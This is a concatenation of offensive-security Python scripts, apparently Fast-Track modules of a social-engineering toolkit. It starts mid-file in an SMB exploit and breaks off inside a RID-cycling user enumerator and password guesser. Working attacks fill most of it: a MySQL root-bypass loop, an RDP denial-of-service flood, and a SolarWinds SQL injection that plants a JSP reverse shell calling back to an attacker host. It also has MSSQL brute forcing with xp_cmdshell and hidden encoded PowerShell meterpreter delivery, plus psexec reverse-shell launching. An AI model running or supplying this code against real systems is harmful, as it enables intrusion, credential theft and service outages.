        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub+='\x00\x00\x00\x00'
        self.__stub+='\x2f\x00\x00\x00\x00\x00\x00\x00\x2f\x00\x00\x00'
        self.__stub+=payload
        self.__stub+='\x00\x00\x00\x00'
        self.__stub+='\x02\x00\x00\x00\x02\x00\x00\x00'
        self.__stub+='\x00\x00\x00\x00\x02\x00\x00\x00'
        self.__stub+='\x5c\x00\x00\x00\x01\x00\x00\x00'
        self.__stub+='\x01\x00\x00\x00'
        return

    def run(self):
        try:
            self.__DCEPacket()
            self.__dce.call(0x1f, self.__stub)   #0x1f (or 31)- NetPathCanonicalize Operation
        except:
            print '[-] System appears not to be vulnerable. Sorry.'

try:
    current = SRVSVC_Exploit(target, osver)
    current.start()
except:
    print '[-] Target does not appear vulnerable.'

print "[!] If no errors were thrown. Try connecting to victim on 4444"

########NEW FILE########
__FILENAME__ = mysql_bypass
#!/usr/bin/python
#
#
# This has to be the easiest "exploit" ever. Seriously. Embarassed to submit this a little.
#
# Title: MySQL Remote Root Authentication Bypass
# Written by: Dave Kennedy (ReL1K)
# http://www.trustedsec.com
#
# Original advisory here: seclists.org/oss-sec/2012/q2/493
#
import subprocess

print """
This has to be the easiest "exploit" ever. Seriously. Embarassed to submit this a little.

Title: MySQL Remote Root Authentication Bypass
Written by: Dave Kennedy (ReL1K)
http://www.trustedsec.com

Original advisory here: seclists.org/oss-sec/2012/q2/493

Note, you will see a number of failed login attempts, after about 300, if it doesn't
work, then its not vulnerable.
"""
ipaddr = raw_input("Enter the IP address of the mysql server: ")

while 1:
    subprocess.Popen("mysql --host=%s -u root mysql --password=blah" % (ipaddr), shell=True).wait()

########NEW FILE########
__FILENAME__ = rdpdos
# Exploit Title: Pakyu Cenloder
# Date: March 16 2012
# Author: BMario
# Application Link: Microsoft Terminal Services / Remote Desktop Services
#          http://msdn.microsoft.com/en-us/library/aa383015(v=vs.85).aspx
# Version: any Windows version before 13 Mar 2012
# Platforms:    Windows
# Bug:          use after free
# Exploitation: remote, versus server
# Author:       Stanley Marshall
# Tested on: Windows 7 32bit
# CVE : MS12-020

import socket
import sys

print "Microsoft Terminal Services / Remote Desktop Services - Denial of Service"

headpack = "030000130ee000000000000100080000000000".decode('hex')
dafuq = "030001d602f0807f658201940401010401010101ff30190204000000000204000000020204000000000204000000010204000000000204000000010202ffff020400000002301902040000000102040000000102040000000102040000000102040000000002040000000102020420020400000002301c0202ffff0202fc170202ffff0204000000010204000000000204000000010202ffff02040000000204820133000500147c0001812a000800100001c00044756361811c01c0d800040008008002e00101ca03aa09040000ce0e000048004f005300540000000000000000000000000000000000000000000000000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca010000000000100007000100300030003000300030002d003000300030002d0030003000300030003000300030002d003000300030003000300000000000000000000000000000000000000000000000000004c00c000d0000000000000002c00c001b0000000000000003c02c0003000000726470647200000000008080636c6970726472000000a0c0726470736e640000000000c0".decode('hex')
dafree = "0300000802f08028".decode('hex')

trololo = headpack+dafuq+dafree

#HOSTNYO = sys.argv[1]
HOSTNYO = raw_input("Enter the IP address to crash (remote desktop): ")
PORTNYO = 3389
for i in range(10240):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOSTNYO,PORTNYO))
    s.send(trololo)
    rec = s.recv(1024)
    s.close()

########NEW FILE########
__FILENAME__ = solarwinds
#!/usr/bin/python
######################################################################################
# Exploit Title: Solarwinds Storage Manager 5.1.0 Remote SYSTEM SQL Injection Exploit
# Date: May 2nd 2012
# Author: muts
# Version: SolarWinds Storage Manager 5.1.0
# Tested on: Windows 2003
# Archive Url : http://www.offensive-security.com/0day/solarshell.txt
######################################################################################
# Discovered by Digital Defence - DDIVRT-2011-39
######################################################################################


import urllib, urllib2, cookielib
import sys
import random

print "\n[*] Solarwinds Storage Manager 5.1.0 Remote SYSTEM SQL Injection Exploit"
print "[*] Vulnerability discovered by Digital Defence - DDIVRT-2011-39"

print "[*] Offensive Security - http://www.offensive-security.com\n"

#if (len(sys.argv) != 4):
#    print "[*] Usage: solarshell.py <RHOST> <LHOST> <LPORT>"
#    exit(0)

#rhost = sys.argv[1]
#lhost = sys.argv[2]
#lport = sys.argv[3]

rhost = raw_input("Enter the remote host IP address: ")
lhost = raw_input("Enter the attacker IP address: ")
lport = raw_input("Enter the local port: ")

filename = ''
for i in random.sample('abcdefghijklmnopqrstuvwxyz1234567890',6):
    filename+=i
filename +=".jsp"

output_path= "c:/Program Files/SolarWinds/Storage Manager Server/webapps/ROOT/%s" %filename

jsp = '''<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
    class StreamConnector extends Thread
    {
        InputStream is;
        OutputStream os;

        StreamConnector( InputStream is, OutputStream os )
        {
        this.is = is;
        this.os = os;
        }

        public void run()
        {
        BufferedReader in  = null;
        BufferedWriter out = null;
try
{
    in  = new BufferedReader( new InputStreamReader( this.is ) );
    out = new BufferedWriter( new OutputStreamWriter( this.os ) );
    char buffer[] = new char[8192];
    int length;
    while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
    {
        out.write( buffer, 0, length );
        out.flush();
    }
} catch( Exception e ){}
try
{
    if( in != null )
        in.close();
    if( out != null )
        out.close();
} catch( Exception e ){}
        }
    }

    try
    {
        Socket socket = new Socket( "''' + lhost +'''", '''+lport+''');
        Process process = Runtime.getRuntime().exec( "cmd.exe" );
        ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
        ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
    } catch( Exception e ) {}
%>'''

jsp = jsp.replace("\n","")
jsp = jsp.replace("\t","")

prepayload = "AAA' "
prepayload += 'union select 0x%s,2,3,4,5,6,7,8,9,10,11,12,13,14 into outfile "%s"' % (jsp.encode('hex'),output_path)
prepayload += "#"
postpayload = "1' or 1=1#--"
loginstate='checkLogin'
password = 'OHAI'

cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
post_params = urllib.urlencode({'loginState' : loginstate, 'loginName' : prepayload,'password' : password})
print "[*] Sending evil payload"
resp = opener.open("http://%s:9000/LoginServlet" %rhost, post_params)
print "[*] Triggering shell"
post_params = urllib.urlencode({'loginState' : loginstate, 'loginName' : postpayload,'password' : password})
resp = opener.open("http://%s:9000/LoginServlet" % rhost, post_params)
resp = opener.open("http://%s:9000/%s"  % (rhost,filename))
print "[*] Check your shell on %s %s\n" % (lhost,lport)

# 01010011 01101100 01100101 01100101 01110000 01101001 01110011 01101111
# 01110110 01100101 01110010 01110010 01100001 01110100 01100101 01100100

########NEW FILE########
__FILENAME__ = mssql
#!/usr/bin/python
from src.core.setcore import *
from impacket import tds
import sys
import subprocess
import socket
import re
import os
import time
import binascii
import base64
import shutil

#
# this is the mssql modules
#

# define the base path
definepath = definepath()
operating_system = check_os()

msf_path = meta_path()

#
# this is the brute forcer
#
def brute(ipaddr,username,port,wordlist):
    # if ipaddr being passed is invalid
    if ipaddr == "":
        return False
    if ipaddr != "":
        # base counter for successful brute force
        counter = 0
        # build in quick wordlist
        if wordlist == "default":
            wordlist = "src/fasttrack/wordlist.txt"

        # read in the file
        password = file(wordlist, "r")
        for passwords in password:
            passwords = passwords.rstrip()
            # try actual password
            try:
            
                ipaddr = str(ipaddr)
                print "Attempting to brute force " + bcolors.BOLD + bcolors.ENDC + " with username of " + bcolors.BOLD + username + bcolors.ENDC + " and password of " + bcolors.BOLD + passwords + bcolors.ENDC

                # connect to the sql server and attempt a password
                if ":" in ipaddr:   
                    #target_server = _mssql.connect(ipaddr, username, passwords)
                    ipaddr = ipaddr.split(":")
                    port = ipaddr[1]
                    ipaddr = ipaddr[0]
                    #target_server = _mssql.connect(ipaddr + ":" + str(port), username, passwords)
                sql_server = tds.MSSQL(str(ipaddr), int(port))

                # print that we were successful
                sql_server.connect()
                #target_server = False
                target_server = sql_server.login("master", username, passwords)
            
                if target_server:
                    print_status("\nSuccessful login with username %s and password: %s" % (username, passwords))
                    counter = 1
                    break

            # if login failed or unavailable server
            except Exception, e:
                    pass

        # if we brute forced a machine
        if counter == 1:
            if ":" in ipaddr:
                ipaddr = ipaddr.split(":")
                ipaddr = ipaddr[0]
            return ipaddr + "," + username + "," + str(port) + "," + passwords
        # else we didnt and we need to return a false
        else:
            if ipaddr != '':
                print_warning("Unable to guess the SQL password for %s with username of %s" % (ipaddr,username))
            return False


#
# this will deploy an already prestaged executable that reads in hexadecimal and back to binary
#
def deploy_hex2binary(ipaddr,port,username,password):

    mssql = tds.MSSQL(ipaddr, int(port))
    mssql.connect()
    mssql.login("master", username, password)
    print_status("Enabling the xp_cmdshell stored procedure...")
    try:
        mssql.sql_query("exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
    except: pass
    print_status("Checking if powershell is installed on the system...")
    # just throw a simple command via powershell to get the output
    mssql.sql_query("exec master..xp_cmdshell 'powershell -Version'")
    bundle = str(capture(mssql.printRows))
    # remove null byte terminators from capture output
    bundle = bundle.replace("\\x00", "")
    # search for parameter version - standard output for powershell -Version command
    match = re.search("parameter version", bundle)
    # if we have a match we have powershell installed
    if match:
        print_status("Powershell was identified, targeting server through powershell injection.")
        option = "1"
    # otherwise, fall back to the older version using debug conversion via hex
    else:
        print_status("Powershell not detected, attempting Windows debug method.")
        option = "2"

    # if we don't have powershell
    if option == "2":
        try: reload(src.core.payloadgen.create_payloads)
        except: import src.core.payloadgen.create_payloads
        print_status("Connection established with SQL Server...")
        print_status("Converting payload to hexadecimal...")
        # if we are using a SET interactive shell payload then we need to make the path under web_clone versus ~./set
        if os.path.isfile(setdir + "/set.payload"):
            web_path = (setdir + "/web_clone/")
        # then we are using metasploit
        if not os.path.isfile(setdir + "/set.payload"):
            if operating_system == "posix":
                web_path = (setdir)
                # if it isn't there yet
                if not os.path.isfile(setdir + "/1msf.exe"):
                    # move it then
                    subprocess.Popen("cp %s/msf.exe %s/1msf.exe" % (setdir, setdir), shell=True).wait()
                subprocess.Popen("cp %s/1msf.exe %s/ 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
                subprocess.Popen("cp %s/msf2.exe %s/msf.exe 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
        fileopen = file("%s/1msf.exe" % (web_path), "rb")
        # read in the binary
        data = fileopen.read()
        # convert the binary to hex
        data = binascii.hexlify(data)
        # we write out binary out to a file
        filewrite = file(setdir + "/payload.hex", "w")
        filewrite.write(data)
        filewrite.close()

        # if we are using metasploit, start the listener
        if not os.path.isfile(setdir + "/set.payload"):
            if operating_system == "posix":
                try:reload(pexpect)
                except: import pexpect
                print_status("Starting the Metasploit listener...")
                msf_path = meta_path()
                child2 = pexpect.spawn("%s/msfconsole -r %s/meta_config" % (msf_path,setdir))

        # random executable name
        random_exe = generate_random_string(10,15)

    #
    # next we deploy our hex to binary if we selected option 1 (powershell)
    #

    if option == "1":
        print_status("Using powershell x86 process downgrade attack..")
        payload = "x86"

        # specify ipaddress of reverse listener
        ipaddr = grab_ipaddress()
        update_options("IPADDR=" + ipaddr)
        port = raw_input(setprompt(["29"], "Enter the port for the reverse [443]"))
        if port == "": port = "443"
        update_options("PORT=" + port)
        update_options("POWERSHELL_SOLO=ON")
        print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")
        filewrite = file(setdir + "/payload_options.shellcode", "w")
        # format needed for shellcode generation
        filewrite.write("windows/meterpreter/reverse_tcp" + " " + port + ",")
        filewrite.close()
        try: reload(src.payloads.powershell.prep)
        except: import src.payloads.powershell.prep
        # create the directory if it does not exist
        if not os.path.isdir(setdir + "/reports/powershell"):
            os.makedirs(setdir + "/reports/powershell")

        x86 = file(setdir + "/x86.powershell", "r")
        x86 = x86.read()
        x86 = "powershell -nop -win hidden -noni -enc " + x86
        print_status("If you want the powershell commands and attack, they are exported to %s/reports/powershell/" % (setdir))
        filewrite = file(setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
        filewrite.write(x86)
        filewrite.close()
        # if our payload is x86 based - need to prep msfconsole rc 
        if payload == "x86":
                powershell_command = x86
                powershell_dir = setdir + "/reports/powershell/x86_powershell_injection.txt"
                filewrite = file(setdir + "/reports/powershell/powershell.rc", "w")
                filewrite.write("use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lport %s\nset LHOST 0.0.0.0\nexploit -j" % (port))
                filewrite.close()

        # grab the metasploit path from config or smart detection
        msf_path = meta_path()
        if operating_system == "posix":
                try: reload(pexpect)
                except: import pexpect
                print_status("Starting the Metasploit listener...")
                child2 = pexpect.spawn("%s/msfconsole -r %s/reports/powershell/powershell.rc" % (msf_path,setdir))

        # assign random_exe command to the powershell command
        random_exe = powershell_command

    #
    # next we deploy our hex to binary if we selected option 2 (debug)
    #
    
    if option == "2":
        # we selected hex to binary
        fileopen = file("src/payloads/hex2binary.payload", "r")
        # specify random filename for deployment
        print_status("Deploying initial debug stager to the system.")
        random_file = generate_random_string(10,15)
        for line in fileopen:
            # remove bogus chars
            line = line.rstrip()
            # make it printer friendly to screen
            print_line = line.replace("echo e", "")
            print_status("Deploying stager payload (hex): " + bcolors.BOLD + str(print_line) + bcolors.ENDC)
            mssql.sql_query("exec master..xp_cmdshell '%s>> %s'" % (line,random_file))
        print_status("Converting the stager to a binary...")
        # here we convert it to a binary
        mssql.sql_query("exec master..xp_cmdshell 'debug<%s'" % (random_file))
        print_status("Conversion complete. Cleaning up...")
        # delete the random file
        mssql.sql_query("exec master..xp_cmdshell 'del %s'" % (random_file))

        # here we start the conversion and execute the payload
        print_status("Sending the main payload via to be converted back to a binary.")
        # read in the file 900 bytes at a time
        fileopen = file(setdir + "/payload.hex", "r")
        while fileopen:
            data = fileopen.read(900).rstrip()
            # if data is done then break out of loop because file is over
            if data == "": break
            print_status("Deploying payload to victim machine (hex): " + bcolors.BOLD + str(data) + bcolors.ENDC + "\n")
            mssql.sql_query("exec master..xp_cmdshell 'echo %s>> %s'" % (data, random_exe))
        print_status("Delivery complete. Converting hex back to binary format.")

        mssql.sql_query("exec master..xp_cmdshell 'rename MOO.bin %s.exe'" % (random_file))
        mssql.sql_query("exec master..xp_cmdshell '%s %s'" % (random_file, random_exe))
        # clean up the old files
        print_status("Cleaning up old files..")
        mssql.sql_query("exec master..xp_cmdshell 'del %s'" % (random_exe))

        # if we are using SET payload
        if os.path.isfile(setdir + "/set.payload"):
            print_status("Spawning seperate child process for listener...")
            try: shutil.copyfile(setdir + "/web_clone/x", definepath)
            except: pass

            # start a threaded webserver in the background
            subprocess.Popen("python src/html/fasttrack_http_server.py", shell=True)
            # grab the port options

            if check_options("PORT=") != 0:
                port = check_options("PORT=")

            # if for some reason the port didnt get created we default to 443
            else:
                port = "443"

    # thread is needed here due to the connect not always terminating thread, it hangs if thread isnt specified
    try: reload(thread)
    except: import thread
    # execute the payload
    # we append more commands if option 1 is used

    if option == "1":
        print_status("Trigger the powershell injection payload.. ")
        mssql.sql_query("exec master..xp_cmdshell '%s'" % (powershell_command))

    if option == "2":
        sql_command = ("xp_cmdshell '%s'" % (random_exe))
        # start thread of SQL command that executes payload
        thread.start_new_thread(mssql.sql_query, (sql_command,))
        time.sleep(1)

    # pause to let metasploit launch - real slow systems may need to adjust
    # i need to rewrite this to do a child.expect on msf and wait until that happens
    print_status("Pausing 15 seconds to let the system catch up...")
    time.sleep(15)
    print_status("Triggering payload stager...")

    # if pexpect doesnt exit right then it freaks out
    if os.path.isfile(setdir + "/set.payload"):
        os.system("python ../../payloads/set_payloads/listener.py")
    try:
        # interact with the child process through pexpect
        child2.interact()
        try:
            os.remove("x")
        except: pass
    except: pass


#
# this will deploy an already prestaged executable that reads in hexadecimal and back to binary
#
def cmdshell(ipaddr,port,username,password,option):
    # connect to SQL server
    mssql = tds.MSSQL(ipaddr, int(port))
    mssql.connect()
    mssql.login("master", username, password)
    print_status("Connection established with SQL Server...")
    print_status("Attempting to re-enable xp_cmdshell if disabled...")
    try:
        mssql.sql_query("exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
    except Exception, e: pass
    print_status("Enter your Windows Shell commands in the xp_cmdshell - prompt...")
    while 1:
        # prompt mssql
        cmd = raw_input("mssql>")
        # if we want to exit
        if cmd == "quit" or cmd == "exit": break
        # if the command isnt empty
        if cmd != "":
            # execute the command
            mssql.sql_query("exec master..xp_cmdshell '%s'" % (cmd))
            # print the rest of the data
            mssql.printReplies()
            mssql.colMeta[0]['TypeData'] = 80*2
            mssql.printRows()

########NEW FILE########
__FILENAME__ = psexec
#############################################
#
# Main SET module for psexec 
#
#############################################
from src.core.setcore import *

# Module options (auxiliary/admin/smb/psexec_command):

#   Name       Current Setting                    Required  Description
#   ----       ---------------                    --------  -----------
#   COMMAND    net group "Domain Admins" /domain  yes       The command you want to execute on the remote host
#   RHOSTS                                        yes       The target address range or CIDR identifier
#   RPORT      445                                yes       The Target port
#   SMBDomain  WORKGROUP                          no        The Windows domain to use for authentication
#   SMBPass                                       no        The password for the specified username
#   SMBSHARE   C$                                 yes       The name of a writeable share on the server
#   SMBUser                                       no        The username to authenticate as
#   THREADS    1                                  yes       The number of concurrent threads
#   WINPATH    WINDOWS                            yes       The name of the remote Windows directory

# msf auxiliary(psexec_command) >

# grab config options for stage encoding
stage_encoding = check_config("STAGE_ENCODING=").lower()
if stage_encoding == "off": stage_encoding = "false"
else: stage_encoding = "true"

rhosts=raw_input(setprompt(["32"], "Enter the IP Address or range (RHOSTS) to connect to")) # rhosts
username=raw_input(setprompt(["32"], "Enter the username")) # username for domain/workgroup
password=raw_input(setprompt(["32"], "Enter the password or the hash")) # password for domain/workgroup
domain=raw_input(setprompt(["32"], "Enter the domain name (hit enter for logon locally)")) # domain name
threads=raw_input(setprompt(["32"], "How many threads do you want [enter for default]"))
# if blank specify workgroup which is the default
if domain == "": domain = "WORKGROUP"
# set the threads
if threads == "": threads = "15"

payload = check_config("POWERSHELL_INJECT_PAYLOAD_X86=").lower()

#
# payload generation for powershell injection
#

try:

   # specify ipaddress of reverse listener
    ipaddr = grab_ipaddress()
    update_options("IPADDR=" + ipaddr)
    port = raw_input(setprompt(["29"], "Enter the port for the reverse [443]"))
    if port == "": port = "443"
    update_options("PORT=" + port)
    filewrite = file(setdir + "/payload_options.shellcode", "w")
    # format needed for shellcode generation
    filewrite.write(payload + " " + port + ",")
    filewrite.close()
    update_options("POWERSHELL_SOLO=ON")
    print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")
    try: reload(src.payloads.powershell.prep)
    except: import src.payloads.powershell.prep
    # create the directory if it does not exist
    if not os.path.isdir(setdir + "/reports/powershell"):
       os.makedirs(setdir + "/reports/powershell")

    x86 = file(setdir + "/x86.powershell", "r")
    x86 = x86.read()
    x86 = "powershell -nop -window hidden -noni -enc " + x86
    print_status("If you want the powershell commands and attack, they are exported to %s/reports/powershell/" % (setdir))
    filewrite = file(setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
    filewrite.write(x86)
    filewrite.close()
    payload = "windows/meterpreter/reverse_tcp\n" # if we are using x86
    command = x86 # assign powershell to command

    # write out our answer file for the powershell injection attack
    filewrite = file(setdir + "/reports/powershell/powershell.rc", "w")
    filewrite.write("use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LPORT %s\nset LHOST 0.0.0.0\nset ExitOnSession false\nexploit -j\nuse auxiliary/admin/smb/psexec_command\nset RHOSTS %s\nset SMBUser %s\nset SMBPass %s\nset SMBDomain %s\nset THREADS %s\nset COMMAND %s\nset EnableStageEncoding %s\nset ExitOnSession false\nexploit\n" % (port,rhosts,username,password,domain,threads,command, stage_encoding))
    filewrite.close()
    msf_path = meta_path()
    # launch metasploit below
    print_status("Launching Metasploit.. This may take a few seconds.")
    subprocess.Popen("ruby %s/msfconsole -L -n -r %s/reports/powershell/powershell.rc" % (msf_path, setdir), shell=True).wait()

# handle exceptions
except Exception, e:
    print_error("Something went wrong printing error: " + str(e))

########NEW FILE########
__FILENAME__ = rid_enum
#!/usr/bin/python
import subprocess
import os
import sys
#############################################################################################################
#
# RID Enum
# RID Cycling Tool
#
# Written by: David Kennedy (ReL1K)
# Website: https://www.trustedsec.com
# Twitter: @TrustedSec
# Twitter: @HackingDave
#
# This tool will use rpcclient to cycle through and identify what rid accounts exist. Uses a few
# different techniques to find the proper RID.
#
# Special thanks to Tom Steele for the pull request update and changes.
#
#############################################################################################################


def usage():
    print """
.______       __   _______         _______ .__   __.  __    __  .___  ___.
|   _  \     |  | |       \       |   ____||  \ |  | |  |  |  | |   \/   |
|  |_)  |    |  | |  .--.  |      |  |__   |   \|  | |  |  |  | |  \  /  |
|      /     |  | |  |  |  |      |   __|  |  . `  | |  |  |  | |  |\/|  |
|  |\  \----.|  | |  '--'  |      |  |____ |  |\   | |  `--'  | |  |  |  |
| _| `._____||__| |_______/  _____|_______||__| \__|  \______/  |__|  |__|
                            |______|

Written by: David Kennedy (ReL1K)
Company: https://www.trustedsec.com
Twitter: @TrustedSec
Twitter: @HackingDave

Rid Enum is a RID cycling attack that attempts to enumerate user accounts through
null sessions and the SID to RID enum. If you specify a password file, it will
automatically attempt to brute force the user accounts when its finished enumerating.

- RID_ENUM is open source and uses all standard python libraries minus python-pexpect. -

You can also specify an already dumped username file, it needs to be in the DOMAINNAME\USERNAME
format.

Example: ./rid_enum.py 192.168.1.50 500 50000 /root/dict.txt

Usage: ./rid_enum.py <server_ip> <start_rid> <end_rid> <optional_password_file> <optional_username_filename>
"""
    sys.exit()

# for nt-status-denied
denied = 0

# attempt to use lsa query first
def check_user_lsa(ip):
    # pull the domain via lsaenum
    proc = subprocess.Popen('rpcclient -U "" %s -N -c "lsaquery"' % ip, stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE, shell=True)
    stdout_value = proc.communicate()[0]
    # if the user wasn't found, return a False
    if not "Domain Sid" in stdout_value:
        return False
    else:
        return stdout_value

# attempt to lookup an account via rpcclient
def check_user(ip, account):
    proc = subprocess.Popen('rpcclient -U "" %s -N -c "lookupnames %s"' % (ip, account), stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE, shell=True)
    stdout_value = proc.communicate()[0]
    # if the user wasn't found, return a False
    if "NT_STATUS_NONE_MAPPED" or "NT_STATUS_CONNECTION_REFUSED" or "NT_STATUS_ACCESS_DENIED" in stdout_value:
        return False
    else:
        return stdout_value


# helper function to break a list up into smaller lists
def chunk(l, n):
    for i in range(0, len(l), n):
        yield l[i:i+n]


# this will do a conversion to find the account name based on rid
# looks up multiple sid-rids at a time provided a range
def sids_to_names(ip, sid, start, stop):
    rid_accounts = []
    ranges = ['%s-%s' % (sid, rid) for rid in range(start, stop)]
    # different chunk size for darwin (os x)
    chunk_size = 2500
    if sys.platform == 'darwin':
        chunk_size = 5000
    chunks = list(chunk(ranges, chunk_size))
    for c in chunks:
        command = 'rpcclient -U "" %s -N -c "lookupsids ' % ip
        command += ' '.join(c)
        command += '"'
        proc = subprocess.Popen(command, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, shell=True)
        stdout_value = proc.communicate()[0]
        if "NT_STATUS_ACCESS_DENIED" in stdout_value:
            print "[!] Server sent NT_STATUS_ACCESS DENIED, unable to extract users."
            global denied
            denied = 1

            break
        for line in stdout_value.rstrip().split('\n'):
            if not "*unknown*" in line:
                if line != "":
                    rid_account = line.split(" ", 1)[1]
                    # will show during an unhandled request
                    # '00000' are bogus accounts?
                    # only return accounts ie. (1). Everything else should be a group
                    if rid_account != "request" and '00000' not in rid_account and '(1)' in rid_account:
                        # here we join based on spaces, for example 'Domain Admins' needs to be joined
                        rid_account = rid_account.replace("(1)", "")
                        # return the full domain\username
                        rid_account = rid_account.rstrip()
                        rid_accounts.append(rid_account)
    return rid_accounts

# capture initial input
success = False
try:
    if len(sys.argv) < 4:
        usage()
    ip = sys.argv[1]
    rid_start = sys.argv[2]
    rid_stop = sys.argv[3]
    # if password file was specified
    passwords = ""
    # if we use userlist
    userlist = ""
    if len(sys.argv) > 4:
        # pull in password file
        passwords = sys.argv[4]
        # if its not there then bomb out
        if not os.path.isfile(passwords):
            print "[!] File was not found. Please try a path again."
            sys.exit()
    if len(sys.argv) > 5:
        userlist = sys.argv[5]
        if not os.path.isfile(userlist):
            print "[!] File was not found. Please try a path again."
            sys.exit()

    # check for python pexpect
    try:
        import pexpect
    # if we don't have it
    except ImportError:
        print "[!] Sorry boss, python-pexpect is not installed. You need to install this first."
        sys.exit()

    # if userlist is being used versus rid enum, then skip all of this
    if not userlist:
        print "[*] Attempting lsaquery first...This will enumerate the base domain SID"
        # call the check_user_lsa function and check to see if we can find base SID guid
        sid = check_user_lsa(ip)
        # if lsa enumeration was successful then don't do
        if sid:
            print "[*] Successfully enumerated base domain SID. Printing information: \n" + sid.rstrip()
            print "[*] Moving on to extract via RID cycling attack.. "
            # format it properly
            sid = sid.rstrip()
            sid = sid.split(" ")
            sid = sid[4]
        # if we weren't successful on lsaquery
        else:
            print "[!] Unable to enumerate through lsaquery, trying default account names.."
            accounts = ("administrator", "guest", "krbtgt", "root")
            for account in accounts:
                # check the user account based on tuple
                sid = check_user(ip, account)
                # if its false then cycle threw
                if not sid:
                    print "[!] Failed using account name: %s...Attempting another." % account
                else:
                    # success! Break out of the loop
                    print "[*] Successfully enumerated SID account.. Moving on to extract via RID.\n"
                    break
            # if we found one
            if sid != False:
                # pulling the exact domain SID out
                sid = sid.split(" ")
                # pull first in tuple
                sid = sid[1]
                # remove the RID number
                sid = sid[:-4]
                # we has no sids :( exiting
            if sid == False:
                denied = 1
                print "[!] Failed to enumerate SIDs, pushing on to another method."

        print "[*] Enumerating user accounts.. This could take a little while."
        # assign rid start and stop as integers
        rid_start = int(rid_start)
        rid_stop = int(rid_stop)

        # this is where we write out our output
        if os.path.isfile("%s_users.txt" % ip):
            # remove old file
            os.remove("%s_users.txt" % ip)
        filewrite = file("%s_users.txt" % ip, "a")

        # cycle through rid and enumerate the domain
        sid_names = sids_to_names(ip, sid, rid_start, rid_stop)
        if sid_names:
            for name in sid_names:
                # print the sid
                print "Account name: " + name
                # write the file out
                filewrite.write(name + "\n")
        # close the file
        filewrite.close()
        if denied == 0:
            print "[*] RID_ENUM has finished enumerating user accounts..."

        # if we failed all other methods, we'll move to enumdomusers
        if denied == 1:
            print "[*] Attempting enumdomusers to enumerate users..."
            proc = subprocess.Popen("rpcclient -U '' -N %s -c 'enumdomusers'" % (ip), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            filewrite = file("%s_users.txt" % ip, "a")
            counter = 0
            for line in iter(proc.stdout.readline, ''):
                counter = 1
                if line != '':
                    if "user:" in line:
                        # cycle through
                        line = line.split("rid:")
                        line = line[0].replace("user:[", "").replace("]", "")
                        print line
                        filewrite.write(line + "\n")
                    else:
                        denied = 2
                        break
                else:
                    if counter == 0:
                        break

            # if we had nothing to pull
            if counter == 0:
                denied = 2

            if denied == 2:
                print "[!] Sorry. RID_ENUM failed to successfully enumerate users. Bummers."

            if denied == 1:
                filewrite.close()
                print "[*] Finished dumping users, saved to %s_users.txt." % (ip)

    # if we specified a password list
    if passwords:
        # our password file
        passfile = file(passwords, "r").readlines()
        userfile = ""
        # if userlist was specified
        if userlist:
            # use the userlist specified
            userfile = file(userlist, "r").readlines()
        # our list of users
        else:
            userfile = file("%s_users.txt" % ip, "r").readlines()

        # write out the files upon success
        filewrite = file("%s_success_results.txt" % ip, "a")

        # cycle through username first
        for user in userfile:
            user = user.rstrip()
            user_fixed = user.replace("\\", "\\\\")

            # if the user isn't blank
            if user:
                for password in passfile:
                    password = password.rstrip()
                    # if we specify a lowercase username
                    if password == "lc username":
                        try:
                            if "\\" in password:
                                password = user.split("\\")[1]
                                password = password.lower()
                            # if domain isn't specified
                            else: password = user.lower()
                        except: pass
                    # if we specify a uppercase username
                    if password == "uc username":
                        try:
                            if "\\" in password:
                                password = user.split("\\")[1]
                                password = password.upper()
                            else: password = user.lower()
                        except: pass
                    child = pexpect.spawn("rpcclient -U '%s%%%s' %s" % (user_fixed, password, ip))
                    i = child.expect(['LOGON_FAILURE', 'rpcclient', 'NT_STATUS_ACCOUNT_EXPIRED',
                                      'NT_STATUS_ACCOUNT_LOCKED_OUT', 'NT_STATUS_PASSWORD_MUST_CHANGE', 'NT_STATUS_ACCOUNT_DISABLED', 'NT_STATUS_LOGON_TYPE_NOT_GRANTED', 'NT_STATUS_BAD_NETWORK_NAME', 'NT_STATUS_CONNECTION_REFUSED'])

                    # login failed for this one
                    if i == 0:
                        if "\\" in password:
                            password = password.split("\\")[1]
                        print "Failed guessing username of %s and password of %s" % (user, password)
                        child.kill(0)

                    # if successful
                    if i == 1:
                        print "[*] Successfully guessed username: %s with password of: %s" % (user, password)
                        filewrite.write("username: %s password: %s\n" % (user, password))
                        success = True
                        child.kill(0)

                    # if account expired
                    if i == 2:
                        print "[-] Successfully guessed username: %s with password of: %s however, it is set to expired." % (user, password)
                        filewrite.write("username: %s password: %s\n" % (user, password))
                        success = True
                        child.kill(0)

                    # if account is locked out
                    if i == 3:
                        print "[!] Careful. Received a NT_STATUS_ACCOUNT_LOCKED_OUT was detected.. \
                               You may be locking accounts out!"
                        child.kill(0)

                    # if account change is needed
                    if i == 4:
